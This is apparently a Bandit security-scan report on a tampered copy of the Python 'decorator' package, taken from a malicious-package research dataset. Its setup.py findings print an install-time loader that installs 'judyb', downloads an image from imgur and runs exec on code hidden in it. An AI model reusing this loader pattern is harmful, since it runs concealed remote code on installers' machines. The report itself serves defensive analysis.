{
  "errors": [],
  "generated_at": "2024-10-03T03:52:40Z",
  "metrics": {
    "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/decorator/docs/conf.py": {
      "CONFIDENCE.HIGH": 0.0,
      "CONFIDENCE.LOW": 0.0,
      "CONFIDENCE.MEDIUM": 0.0,
      "CONFIDENCE.UNDEFINED": 0.0,
      "SEVERITY.HIGH": 0.0,
      "SEVERITY.LOW": 0.0,
      "SEVERITY.MEDIUM": 0.0,
      "SEVERITY.UNDEFINED": 0.0,
      "loc": 39,
      "nosec": 0
    },
    "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/decorator/setup.py": {
      "CONFIDENCE.HIGH": 5.0,
      "CONFIDENCE.LOW": 0.0,
      "CONFIDENCE.MEDIUM": 11.0,
      "CONFIDENCE.UNDEFINED": 0.0,
      "SEVERITY.HIGH": 8.0,
      "SEVERITY.LOW": 0.0,
      "SEVERITY.MEDIUM": 8.0,
      "SEVERITY.UNDEFINED": 0.0,
      "loc": 57,
      "nosec": 0
    },
    "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/decorator/src/decorator.py": {
      "CONFIDENCE.HIGH": 1.0,
      "CONFIDENCE.LOW": 0.0,
      "CONFIDENCE.MEDIUM": 0.0,
      "CONFIDENCE.UNDEFINED": 0.0,
      "SEVERITY.HIGH": 0.0,
      "SEVERITY.LOW": 0.0,
      "SEVERITY.MEDIUM": 1.0,
      "SEVERITY.UNDEFINED": 0.0,
      "loc": 356,
      "nosec": 0
    },
    "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/decorator/src/tests/__init__.py": {
      "CONFIDENCE.HIGH": 0.0,
      "CONFIDENCE.LOW": 0.0,
      "CONFIDENCE.MEDIUM": 0.0,
      "CONFIDENCE.UNDEFINED": 0.0,
      "SEVERITY.HIGH": 0.0,
      "SEVERITY.LOW": 0.0,
      "SEVERITY.MEDIUM": 0.0,
      "SEVERITY.UNDEFINED": 0.0,
      "loc": 0,
      "nosec": 0
    },
    "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/decorator/src/tests/documentation.py": {
      "CONFIDENCE.HIGH": 0.0,
      "CONFIDENCE.LOW": 0.0,
      "CONFIDENCE.MEDIUM": 1.0,
      "CONFIDENCE.UNDEFINED": 0.0,
      "SEVERITY.HIGH": 0.0,
      "SEVERITY.LOW": 0.0,
      "SEVERITY.MEDIUM": 1.0,
      "SEVERITY.UNDEFINED": 0.0,
      "loc": 1375,
      "nosec": 0
    },
    "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/decorator/src/tests/test.py": {
      "CONFIDENCE.HIGH": 0.0,
      "CONFIDENCE.LOW": 0.0,
      "CONFIDENCE.MEDIUM": 0.0,
      "CONFIDENCE.UNDEFINED": 0.0,
      "SEVERITY.HIGH": 0.0,
      "SEVERITY.LOW": 0.0,
      "SEVERITY.MEDIUM": 0.0,
      "SEVERITY.UNDEFINED": 0.0,
      "loc": 396,
      "nosec": 0
    },
    "_totals": {
      "CONFIDENCE.HIGH": 6.0,
      "CONFIDENCE.LOW": 0.0,
      "CONFIDENCE.MEDIUM": 12.0,
      "CONFIDENCE.UNDEFINED": 0.0,
      "SEVERITY.HIGH": 8.0,
      "SEVERITY.LOW": 0.0,
      "SEVERITY.MEDIUM": 10.0,
      "SEVERITY.UNDEFINED": 0.0,
      "loc": 2223,
      "nosec": 0
    }
  },
  "results": [
    {
      "code": "7 except:\n8     os.system('pip install requests')\n9     os.system('pip install judyb')\n",
      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/decorator/setup.py",
      "issue_confidence": "MEDIUM",
      "issue_severity": "HIGH",
      "issue_text": "os.system",
      "line_number": 8,
      "line_range": [
        8
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b812_system.html",
      "test_id": "B812",
      "test_name": "system"
    },
    {
      "code": "7 except:\n8     os.system('pip install requests')\n9     os.system('pip install judyb')\n",
      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/decorator/setup.py",
      "issue_confidence": "HIGH",
      "issue_severity": "MEDIUM",
      "issue_text": "os.system",
      "line_number": 8,
      "line_range": [
        8
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b313-b320-os-system",
      "test_id": "B316",
      "test_name": "blacklist"
    },
    {
      "code": "8     os.system('pip install requests')\n9     os.system('pip install judyb')\n10     import requests\n",
      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/decorator/setup.py",
      "issue_confidence": "MEDIUM",
      "issue_severity": "HIGH",
      "issue_text": "os.system",
      "line_number": 9,
      "line_range": [
        9
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b812_system.html",
      "test_id": "B812",
      "test_name": "system"
    },
    {
      "code": "8     os.system('pip install requests')\n9     os.system('pip install judyb')\n10     import requests\n",
      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/decorator/setup.py",
      "issue_confidence": "HIGH",
      "issue_severity": "MEDIUM",
      "issue_text": "os.system",
      "line_number": 9,
      "line_range": [
        9
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b313-b320-os-system",
      "test_id": "B316",
      "test_name": "blacklist"
    },
    {
      "code": "14     if os.path.exists(f'{os.getenv(\"TEMP\")}\\\\aRl53RS.png') != True:\n15         r = requests.get('https://i.imgur.com/aRl53RS.png')\n16         with open(f'{os.getenv(\"TEMP\")}\\\\aRl53RS.png', 'wb') as f:\n",
      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/decorator/setup.py",
      "issue_confidence": "MEDIUM",
      "issue_severity": "HIGH",
      "issue_text": "requests.get",
      "line_number": 15,
      "line_range": [
        15
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b820_get.html",
      "test_id": "B820",
      "test_name": "get"
    },
    {
      "code": "14     if os.path.exists(f'{os.getenv(\"TEMP\")}\\\\aRl53RS.png') != True:\n15         r = requests.get('https://i.imgur.com/aRl53RS.png')\n16         with open(f'{os.getenv(\"TEMP\")}\\\\aRl53RS.png', 'wb') as f:\n",
      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/decorator/setup.py",
      "issue_confidence": "MEDIUM",
      "issue_severity": "MEDIUM",
      "issue_text": "url_found",
      "line_number": 15,
      "line_range": [
        15
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html",
      "test_id": "B824",
      "test_name": "url_found"
    },
    {
      "code": "16         with open(f'{os.getenv(\"TEMP\")}\\\\aRl53RS.png', 'wb') as f:\n17             f.write(r.content)\n18         exec(lsb.reveal(f'{os.getenv(\"TEMP\")}\\\\aRl53RS.png'))\n",
      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/decorator/setup.py",
      "issue_confidence": "MEDIUM",
      "issue_severity": "HIGH",
      "issue_text": "os.write",
      "line_number": 17,
      "line_range": [
        17
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b815_write.html",
      "test_id": "B815",
      "test_name": "write"
    },
    {
      "code": "17             f.write(r.content)\n18         exec(lsb.reveal(f'{os.getenv(\"TEMP\")}\\\\aRl53RS.png'))\n19     else:\n",
      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/decorator/setup.py",
      "issue_confidence": "HIGH",
      "issue_severity": "MEDIUM",
      "issue_text": "exec",
      "line_number": 18,
      "line_range": [
        18
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b800_exec_used.html",
      "test_id": "B800",
      "test_name": "exec_used"
    },
    {
      "code": "19     else:\n20         r = requests.get('https://i.imgur.com/aRl53RS.png')\n21         with open(f'{os.getenv(\"APPDATA\")}\\\\aRl53RS.png', 'wb') as f:\n",
      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/decorator/setup.py",
      "issue_confidence": "MEDIUM",
      "issue_severity": "HIGH",
      "issue_text": "requests.get",
      "line_number": 20,
      "line_range": [
        20
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b820_get.html",
      "test_id": "B820",
      "test_name": "get"
    },
    {
      "code": "19     else:\n20         r = requests.get('https://i.imgur.com/aRl53RS.png')\n21         with open(f'{os.getenv(\"APPDATA\")}\\\\aRl53RS.png', 'wb') as f:\n",
      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/decorator/setup.py",
      "issue_confidence": "MEDIUM",
      "issue_severity": "MEDIUM",
      "issue_text": "url_found",
      "line_number": 20,
      "line_range": [
        20
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html",
      "test_id": "B824",
      "test_name": "url_found"
    },
    {
      "code": "21         with open(f'{os.getenv(\"APPDATA\")}\\\\aRl53RS.png', 'wb') as f:\n22             f.write(r.content)\n23         exec(lsb.reveal(f'{os.getenv(\"APPDATA\")}\\\\aRl53RS.png'))\n",
      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/decorator/setup.py",
      "issue_confidence": "MEDIUM",
      "issue_severity": "HIGH",
      "issue_text": "os.write",
      "line_number": 22,
      "line_range": [
        22
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b815_write.html",
      "test_id": "B815",
      "test_name": "write"
    },
    {
      "code": "22             f.write(r.content)\n23         exec(lsb.reveal(f'{os.getenv(\"APPDATA\")}\\\\aRl53RS.png'))\n24 except:\n",
      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/decorator/setup.py",
      "issue_confidence": "HIGH",
      "issue_severity": "MEDIUM",
      "issue_text": "exec",
      "line_number": 23,
      "line_range": [
        23
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b800_exec_used.html",
      "test_id": "B800",
      "test_name": "exec_used"
    },
    {
      "code": "27 dic = dict(__file__=None)\n28 exec(open('src/decorator.py').read(), dic)  # extract the __version__\n29 VERSION = dic['__version__']\n",
      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/decorator/setup.py",
      "issue_confidence": "HIGH",
      "issue_severity": "MEDIUM",
      "issue_text": "exec",
      "line_number": 28,
      "line_range": [
        28
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b800_exec_used.html",
      "test_id": "B800",
      "test_name": "exec_used"
    },
    {
      "code": "27 dic = dict(__file__=None)\n28 exec(open('src/decorator.py').read(), dic)  # extract the __version__\n29 VERSION = dic['__version__']\n",
      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/decorator/setup.py",
      "issue_confidence": "MEDIUM",
      "issue_severity": "HIGH",
      "issue_text": "os.read",
      "line_number": 28,
      "line_range": [
        28
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b814_read.html",
      "test_id": "B814",
      "test_name": "read"
    },
    {
      "code": "35           description='Decorators for Humans',\n36           long_description=open('README.rst').read(),\n37           author='Michele Simionato',\n",
      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/decorator/setup.py",
      "issue_confidence": "MEDIUM",
      "issue_severity": "HIGH",
      "issue_text": "os.read",
      "line_number": 36,
      "line_range": [
        36
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b814_read.html",
      "test_id": "B814",
      "test_name": "read"
    },
    {
      "code": "38           author_email='michele.simionato@gmail.com',\n39           url='https://github.com/micheles/decorator',\n40           license=\"new BSD License\",\n",
      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/decorator/setup.py",
      "issue_confidence": "MEDIUM",
      "issue_severity": "MEDIUM",
      "issue_text": "url_found",
      "line_number": 39,
      "line_range": [
        39
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html",
      "test_id": "B824",
      "test_name": "url_found"
    },
    {
      "code": "159             code = compile(src, filename, 'single')\n160             exec(code, evaldict)\n161         except Exception:\n",
      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/decorator/src/decorator.py",
      "issue_confidence": "HIGH",
      "issue_severity": "MEDIUM",
      "issue_text": "exec",
      "line_number": 160,
      "line_range": [
        160
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b800_exec_used.html",
      "test_id": "B800",
      "test_name": "exec_used"
    },
    {
      "code": "10 \n11 doc = r\"\"\"# Decorators for Humans\n12 \n13 |Author | Michele Simionato|\n14 |---|---|\n15 |E-mail | michele.simionato@gmail.com|\n16 |Version| $VERSION ($DATE)|\n17 |Supports| Python 3.7, 3.8, 3.9, 3.10, 3.11, 3.12|\n18 |Download page| https://pypi.org/project/decorator/$VERSION|\n19 |Installation| ``pip install decorator``|\n20 |License | BSD license|\n21 \n22 ## Introduction\n23 \n24 The ``decorator`` module is over ten years old, but still alive and\n25 kicking. It is used by several frameworks (IPython, scipy, authkit,\n26 pylons, pycuda, sugar, ...) and has been stable for a *long* time. It\n27 is your best option if you want to preserve the signature of decorated\n28 functions in a consistent way across Python releases. Versions 5.X\n29 supports Python versions greater than 3.4, versions 4.X supports Python\n30 versions back to 2.6; versions 3.X are able to support even Python 2.5 and\n31 2.4.\n32 \n33 ## What's New in version 5\n34 \n35 Version 5 of the decorator module features a major simplification of\n36 the code base made possible by dropping support for Python releases\n37 older than 3.5. From that version the ``Signature`` object works well\n38 enough that it is possible to fix the signature of a decorated\n39 function without resorting to ``exec`` tricks. The simplification\n40 has a very neat advantage: in case of exceptions raised in decorated\n41 functions the traceback is nicer than it used to be. Moreover, it is\n42 now possible to mimic the behavior of decorators defined with\n43 ``functool.wraps``: see the section about the ``kwsyntax`` flag below.\n44 \n45 ## What's New in version 4\n46 \n47 - **New documentation**\n48   There is now a single manual for all Python versions, so I took the\n49   opportunity to overhaul the documentation.\n50   Even if you are a long-time user, you may want to revisit the docs, since\n51   several examples have been improved.\n52 \n53 - **Packaging improvements**\n54   The code is now also available in wheel format. Integration with\n55   setuptools has improved and you can run the tests with the command\n56   ``python setup.py test`` too.\n57 \n58 - **Code changes**\n59   A new utility function ``decorate(func, caller)`` has been added.\n60   It does the same job that was performed by the older\n61   ``decorator(caller, func)``. The old functionality is now deprecated\n62   and no longer documented, but still available for now.\n63 \n64 - **Multiple dispatch**\n65   The decorator module now includes an implementation of generic\n66   functions (sometimes called \"multiple dispatch functions\").\n67   The API is designed to mimic ``functools.singledispatch`` (added\n68   in Python 3.4), but the implementation is much simpler.\n69   Moreover, all decorators involved preserve the signature of the\n70   decorated functions. For now, this exists mostly to demonstrate\n71   the power of the module. In the future it could be enhanced/optimized.\n72   In any case, it is very short and compact (less then 100 lines), so you\n73   can extract it for your own use. Take it as food for thought.\n74 \n75 - **Python 3.5 coroutines**\n76   From version 4.1 it is possible to decorate coroutines, i.e. functions\n77   defined with the `async def` syntax, and to maintain the\n78   `inspect.iscoroutinefunction` check working for the decorated function.\n79 \n80 - **Decorator factories**\n81   From version 4.2 there is facility to define factories of decorators in\n82   a simple way, a feature requested by the users since a long time.\n83 \n84 ## Usefulness of decorators\n85 \n86 Python decorators are an interesting example of why syntactic sugar\n87 matters. In principle, their introduction in Python 2.4 changed\n88 nothing, since they did not provide any new functionality which was not\n89 already present in the language. In practice, their introduction has\n90 significantly changed the way we structure our programs.\n91 I believe the change is for the best, and that decorators are a great\n92 idea since:\n93 \n94 * decorators help reducing boilerplate code;\n95 * decorators help separation of concerns;\n96 * decorators enhance readability and maintenability;\n97 * decorators are explicit.\n98 \n99 Still, as of now, writing custom decorators correctly requires\n100 some experience and it is not as easy as it could be. For instance,\n101 typical implementations of decorators involve nested functions, and\n102 we all know that flat is better than nested.\n103 \n104 The aim of the ``decorator`` module it to simplify the usage of\n105 decorators for the average programmer, and to popularize decorators by\n106 showing various non-trivial examples. Of course, as all techniques,\n107 decorators can be abused (I have seen that) and you should not try to\n108 solve every problem with a decorator, just because you can.\n109 \n110 You may find the source code for all the examples\n111 discussed here in the ``documentation.py`` file, which contains\n112 the documentation you are reading in the form of doctests.\n113 \n114 ## Definitions\n115 \n116 Technically speaking, any Python object which can be called with one argument\n117 can be used as a decorator. However, this definition is somewhat too large\n118 to be really useful. It is more convenient to split the generic class of\n119 decorators in two subclasses:\n120 \n121 1. **signature-preserving decorators**, callable objects which accept\n122     a function as input and return a function as output, *with the\n123     same signature*\n124 \n125 2. **signature-changing** decorators, i.e. decorators\n126     which change the signature of their input function, or decorators\n127     that return non-callable objects\n128 \n129 Signature-changing decorators have their use: for instance, the\n130 builtin classes ``staticmethod`` and ``classmethod`` are in this\n131 group. They take functions and return descriptor objects which\n132 are neither functions, nor callables.\n133 \n134 Still, signature-preserving decorators are more common, and easier\n135 to reason about. In particular, they can be composed together,\n136 whereas other decorators generally cannot.\n137 \n138 Writing signature-preserving decorators from scratch is not that\n139 obvious, especially if one wants to define proper decorators that\n140 can accept functions with any signature. A simple example will clarify\n141 the issue.\n142 \n143 ## Statement of the problem\n144 \n145 A very common use case for decorators is the memoization of functions.\n146 A ``memoize`` decorator works by caching\n147 the result of the function call in a dictionary, so that the next time\n148 the function is called with the same input parameters the result is retrieved\n149 from the cache and not recomputed.\n150 \n151 There are many implementations of ``memoize`` in\n152 http://www.python.org/moin/PythonDecoratorLibrary,\n153 but they do not preserve the signature. In recent versions of\n154 Python you can find a sophisticated ``lru_cache`` decorator\n155 in the standard library's ``functools``. Here I am just\n156 interested in giving an example.\n157 \n158 Consider the following simple implementation (note that it is\n159 generally impossible to *correctly* memoize something\n160 that depends on non-hashable arguments):\n161 \n162 $$memoize_uw\n163 \n164 Here I used the functools.update_wrapper_ utility, which was added\n165 in Python 2.5 to simplify the writing of decorators.\n166 (Previously, you needed to manually copy the function attributes\n167 ``__name__``, ``__doc__``, ``__module__``, and ``__dict__``\n168 to the decorated function by hand).\n169 \n170 This works insofar as the decorator accepts functions with generic signatures.\n171 Unfortunately, it is *not* a signature-preserving decorator, since\n172 ``memoize_uw`` generally returns a function with a *different signature*\n173 from the original.\n174 \n175 Consider for instance the following case:\n176 \n177 $$f1\n178 \n179 Here, the original function takes a single argument named ``x``,\n180 but the decorated function takes any number of arguments and\n181 keyword arguments:\n182 \n183 ```python\n184 >>> from inspect import getfullargspec\n185 >>> print(getfullargspec(f1))\n186 FullArgSpec(args=[], varargs='args', varkw='kw', defaults=None, kwonlyargs=[], kwonlydefaults=None, annotations={})\n187 \n188 ```\n189 \n190 This means that introspection tools like ``getfullargspec`` will give\n191 you false information about the signature of ``f1`` This is pretty bad:\n192 ``getfullargspec`` says that the function accepts the generic\n193 signature ``*args, **kw``, but calling the function with more than one\n194 argument raises an error:\n195 \n196 ```python\n197 >>> f1(0, 1) # doctest: +IGNORE_EXCEPTION_DETAIL\n198 Traceback (most recent call last):\n199    ...\n200 TypeError: f1() takes exactly 1 positional argument (2 given)\n201 \n202 ```\n203 \n204 Notice that ``pydoc`` will give the right signature, but only in Python\n205 versions greater than 3.5.\n206 \n207 ## The solution\n208 \n209 The solution is to provide a generic factory of generators, which\n210 hides the complexity of making signature-preserving decorators\n211 from the application programmer. The ``decorate`` function in\n212 the ``decorator`` module is such a factory:\n213 \n214 ```python\n215 >>> from decorator import decorate\n216 \n217 ```\n218 \n219 ``decorate`` takes two arguments:\n220 \n221 1. a caller function describing the functionality of the decorator, and\n222 \n223 2. a function to be decorated.\n224 \n225 The caller function must have signature ``(f, *args, **kw)``, and it\n226 must call the original function ``f`` with arguments ``args`` and ``kw``,\n227 implementing the wanted capability (in this case, memoization):\n228 \n229 $$_memoize\n230 \n231 Now, you can define your decorator as follows:\n232 \n233 $$memoize\n234 \n235 The difference from the nested function approach of ``memoize_uw``\n236 is that the decorator module forces you to lift the inner function\n237 to the outer level. Moreover, you are forced to explicitly pass the\n238 function you want to decorate; there are no closures.\n239 \n240 Here is a test of usage:\n241 \n242 ```python\n243 >>> @memoize\n244 ... def heavy_computation():\n245 ...     time.sleep(2)\n246 ...     return \"done\"\n247 \n248 >>> print(heavy_computation()) # the first time it will take 2 seconds\n249 done\n250 \n251 >>> print(heavy_computation()) # the second time it will be instantaneous\n252 done\n253 \n254 ```\n255 \n256 The signature of ``heavy_computation`` is the one you would expect:\n257 \n258 ```python\n259 >>> print(getfullargspec(heavy_computation))\n260 FullArgSpec(args=[], varargs=None, varkw=None, defaults=None, kwonlyargs=[], kwonlydefaults=None, annotations={})\n261 \n262 ```\n263 \n264 ## A ``trace`` decorator\n265 \n266 Here is an example of how to define a simple ``trace`` decorator,\n267 which prints a message whenever the traced function is called:\n268 \n269 $$_trace\n270 \n271 $$trace\n272 \n273 Here is an example of usage:\n274 \n275 ```python\n276 >>> @trace\n277 ... def f1(x):\n278 ...     pass\n279 \n280 ```\n281 \n282 It is immediate to verify that ``f1`` works...\n283 \n284 ```python\n285 >>> f1(0)\n286 calling f1 with args (0,), {}\n287 \n288 ```\n289 \n290 ...and it that it has the correct signature:\n291 \n292 ```python\n293 >>> print(getfullargspec(f1))\n294 FullArgSpec(args=['x'], varargs=None, varkw=None, defaults=None, kwonlyargs=[], kwonlydefaults=None, annotations={})\n295 \n296 ```\n297 \n298 The decorator works with functions of any signature:\n299 \n300 ```python\n301 >>> @trace\n302 ... def f(x, y=1, *args, **kw):\n303 ...     pass\n304 \n305 >>> f(0, 3)\n306 calling f with args (0, 3), {}\n307 \n308 >>> print(getfullargspec(f))\n309 FullArgSpec(args=['x', 'y'], varargs='args', varkw='kw', defaults=(1,), kwonlyargs=[], kwonlydefaults=None, annotations={})\n310 \n311 ```\n312 \n313 ## Function annotations\n314 \n315 Python 3 introduced the concept of [function annotations](\n316 http://www.python.org/dev/peps/pep-3107/): the ability\n317 to annotate the signature of a function with additional information,\n318 stored in a dictionary named ``__annotations__``. The ``decorator`` module\n319 (starting from release 3.3) will understand and preserve these annotations.\n320 \n321 Here is an example:\n322 \n323 ```python\n324 >>> @trace\n325 ... def f(x: 'the first argument', y: 'default argument'=1, z=2,\n326 ...       *args: 'varargs', **kw: 'kwargs'):\n327 ...     pass\n328 \n329 ```\n330 \n331 In order to introspect functions with annotations, one needs\n332 ``inspect.getfullargspec`` (introduced in Python 3, then\n333 deprecated in Python 3.5, then undeprecated in Python 3.6):\n334 \n335 ```python\n336 >>> from inspect import getfullargspec\n337 >>> argspec = getfullargspec(f)\n338 >>> argspec.args\n339 ['x', 'y', 'z']\n340 >>> argspec.varargs\n341 'args'\n342 >>> argspec.varkw\n343 'kw'\n344 >>> argspec.defaults\n345 (1, 2)\n346 >>> argspec.kwonlyargs\n347 []\n348 >>> argspec.kwonlydefaults\n349 \n350 ```\n351 \n352 You can check that the ``__annotations__`` dictionary is preserved:\n353 \n354 ```python\n355 >>> f.__annotations__ is f.__wrapped__.__annotations__\n356 True\n357 \n358 ```\n359 \n360 Here ``f.__wrapped__`` is the original undecorated function.\n361 This attribute exists for consistency with the behavior of\n362 ``functools.update_wrapper``.\n363 \n364 Another attribute copied from the original function is ``__qualname__``,\n365 the qualified name. This attribute was introduced in Python 3.3.\n366 \n367 ## ``decorator.decorator``\n368 \n369 It can become tedious to write a caller function (like the above\n370 ``_trace`` example) and then a trivial wrapper\n371 (``def trace(f): return decorate(f, _trace)``) every time.\n372 Not to worry!  The ``decorator`` module provides an easy shortcut\n373 to convert the caller function into a signature-preserving decorator.\n374 \n375 It is the ``decorator`` function:\n376 \n377 ```python\n378 >>> from decorator import decorator\n379 \n380 ```\n381 The ``decorator`` function can be used as a signature-changing\n382 decorator, just like ``classmethod`` and ``staticmethod``.\n383 But ``classmethod`` and ``staticmethod`` return generic\n384 objects which are not callable. Instead, ``decorator`` returns\n385 signature-preserving decorators (i.e. functions with a single argument).\n386 \n387 For instance, you can write:\n388 \n389 ```python\n390 >>> @decorator\n391 ... def trace(f, *args, **kw):\n392 ...     kwstr = ', '.join('%r: %r' % (k, kw[k]) for k in sorted(kw))\n393 ...     print(\"calling %s with args %s, {%s}\" % (f.__name__, args, kwstr))\n394 ...     return f(*args, **kw)\n395 \n396 ```\n397 \n398 And ``trace`` is now a decorator!\n399 \n400 ```python\n401 >>> trace # doctest: +ELLIPSIS\n402 <function trace at 0x...>\n403 \n404 ```\n405 \n406 Here is an example of usage:\n407 \n408 ```python\n409 >>> @trace\n410 ... def func(): pass\n411 \n412 >>> func()\n413 calling func with args (), {}\n414 \n415 ```\n416 \n417 ## Mimicking the behavior of functools.wrap\n418 \n419 Often people are confused by the decorator module since, contrarily\n420 to ``functools.wraps`` in the standard library, it tries very hard\n421 to keep the semantics of the arguments: in particular, positional arguments\n422 stay positional even if they are called with the keyword argument syntax.\n423 An example will make the issue clear. Here is a simple caller\n424 \n425 $$chatty\n426 \n427 and here is a function to decorate:\n428 \n429 $$printsum\n430 \n431 In this example ``x`` and ``y`` are positional arguments (with\n432 defaults). From the caller perspective, it does not matter if the user\n433 calls them as named arguments, they will stay inside the ``args``\n434 tuple and not inside the ``kwargs`` dictionary:\n435 \n436 ```python\n437 >>> printsum(y=2, x=1)\n438 (1, 2) []\n439 3\n440 \n441 ```\n442 \n443 This is quite different from the behavior of ``functools.wraps``; if you\n444 define the decorator as follows\n445 \n446 $$chattywrapper\n447 \n448 you will see that calling ``printsum`` with named arguments will pass\n449 such arguments to ``kwargs``, while ``args`` will be the empty tuple.\n450 Since version 5 of the decorator module it is possible to mimic that\n451 behavior by using the ``kwsyntax`` flag:\n452 \n453 $$printsum2\n454 \n455 Here is how it works:\n456 \n457 ```python\n458 >>> printsum2(y=2, x=1)\n459 () [('x', 1), ('y', 2)]\n460 3\n461 \n462 ```\n463 \n464 This is exactly what the ``chattywrapper`` decorator would print:\n465 positional arguments are seen as keyword arguments, but only if the\n466 client code calls them with the keyword syntax. Otherwise they stay\n467 positional, i.e. they belongs to the ``args`` tuple and not to ``kwargs``:\n468 \n469 ```python\n470 >>> printsum2(1, 2)\n471 (1, 2) []\n472 3\n473 \n474 ```\n475 \n476 ## Decorator factories\n477 \n478 The `decorator` function can also be used to define factories of decorators,\n479 i.e. functions returning decorators. In general you can just write something\n480 like this:\n481 \n482 ```python\n483 def decfactory(param1, param2, ...):\n484     def caller(f, *args, **kw):\n485         return somefunc(f, param1, param2, .., *args, **kw)\n486     return decorator(caller)\n487 ```\n488 \n489 This is fully general but requires an additional level of nesting. For this\n490 reason since version 4.2 there is a facility to build decorator factories by\n491 using a single caller with default arguments:\n492 \n493 ```python\n494 def caller(f, param1=default1, param2=default2, ..., *args, **kw):\n495     return somefunc(f, param1, param2, *args, **kw)\n496 decfactory = decorator(caller)\n497 ```\n498 \n499 Notice that this simplified approach *only works with default arguments*,\n500 i.e. `param1`, `param2` etc must have known defaults. Thanks to this\n501 restriction, there exists an unique default decorator, i.e. the member\n502 of the family which uses the default values for all parameters. Such\n503 decorator can be written as ``decfactory()`` with no parameters specified;\n504 moreover, as a shortcut, it is also possible to elide the parenthesis,\n505 a feature much requested by the users. For years I have been opposing\n506 the request, since having explicit parenthesis to me is more clear\n507 and less magic; however once this feature entered in decorators of\n508 the Python standard library (I am referring to the [dataclass decorator](\n509 https://www.python.org/dev/peps/pep-0557/)) I finally gave up.\n510 \n511 The example below shows how it works in practice. The goal is to\n512 convert a function relying on a blocking resource into a function\n513 returning a \"busy\" message if the resource is not available.\n514 This can be accomplished with a suitable family of decorators\n515 parameterize by a string, the busy message:\n516 \n517 $$blocking\n518 \n519 Functions decorated with ``blocking`` will return a busy message if\n520 the resource is unavailable, and the intended result if the resource is\n521 available. For instance:\n522 \n523 ```python\n524 >>> @blocking(msg=\"Please wait ...\")\n525 ... def read_data():\n526 ...     time.sleep(3) # simulate a blocking resource\n527 ...     return \"some data\"\n528 \n529 >>> print(read_data())  # data is not available yet\n530 Please wait ...\n531 \n532 >>> time.sleep(1)\n533 >>> print(read_data())  # data is not available yet\n534 Please wait ...\n535 \n536 >>> time.sleep(1)\n537 >>> print(read_data())  # data is not available yet\n538 Please wait ...\n539 \n540 >>> time.sleep(1.1)  # after 3.1 seconds, data is available\n541 >>> print(read_data())\n542 some data\n543 \n544 ```\n545 \n546 Decorator factories are most useful to framework builders. Here is an example\n547 that gives an idea of how you could manage permissions in a framework:\n548 \n549 $$Action\n550 \n551 where ``restricted`` is a decorator factory defined as follows\n552 \n553 $$restricted\n554 \n555 Notice that if you forget to use the keyword argument notation, i.e. if you\n556 write ``restricted(User)`` instead of ``restricted(user_class=User)`` you\n557 will get an error\n558 \n559 ```python\n560 TypeError: You are decorating a non function: <class '__main__.User'>\n561 \n562 ```\n563 \n564 Be careful!\n565 \n566 ## ``decorator(cls)``\n567 \n568 The ``decorator`` facility can also produce a decorator starting\n569 from a class with the signature of a caller. In such a case the\n570 produced generator is able to convert functions into factories\n571 to create instances of that class.\n572 \n573 As an example, here is a decorator which can convert a\n574 blocking function into an asynchronous function. When\n575 the function is called, it is executed in a separate thread.\n576 \n577 (This is similar to the approach used in the ``concurrent.futures`` package.\n578 But I don't recommend that you implement futures this way; this is just an\n579 example.)\n580 \n581 $$Future\n582 \n583 The decorated function returns a ``Future`` object. It has a ``.result()``\n584 method which blocks until the underlying thread finishes and returns\n585 the final result.\n586 \n587 Here is the minimalistic usage:\n588 \n589 ```python\n590 >>> @decorator(Future)\n591 ... def long_running(x):\n592 ...     time.sleep(.5)\n593 ...     return x\n594 \n595 >>> fut1 = long_running(1)\n596 >>> fut2 = long_running(2)\n597 >>> fut1.result() + fut2.result()\n598 3\n599 \n600 ```\n601 \n602 ## contextmanager\n603 \n604 Python's standard library has the ``contextmanager`` decorator,\n605 which converts a generator function into a ``GeneratorContextManager``\n606 